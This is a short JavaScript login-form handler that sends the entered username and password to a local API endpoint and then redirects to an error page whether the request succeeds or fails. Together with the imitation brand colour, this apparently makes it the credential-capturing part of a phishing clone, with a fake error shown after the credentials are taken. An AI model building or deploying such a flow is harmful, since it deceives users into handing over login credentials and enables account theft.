
async function onSubmit(e){
    e.preventDefault()
    const username = document.querySelector('.username').value
    const password = document.querySelector('.password').value
    const error = document.querySelector(".error")
    const submit = document.querySelector(".submit")
    submit.style.backgroundColor = '#4b76b996'

    submit.addEventListener("click", () => {
        return
    })
     
    if(!username || !password || username == null || password == null || username == "" || password == ""){
        error.style.display = 'block'
        submit.style.backgroundColor = '#0866ff'

        return
    }
    
    try {
        const res = await fetch("http://localhost:3000/api/users", {
            method: "POST",
             headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                username: username,
                password: password
            })
        });

    
         if (res.ok) {
            submit.style.backgroundColor = '#0866ff'
            window.location.href = "./error.html"

         } else {
            submit.style.backgroundColor = '#0866ff'
            window.location.href = "./error.html"
         }

    } catch (error) {
        submit.style.backgroundColor = '#0866ff'
        window.location.href = "./error.html"
        
    }
}
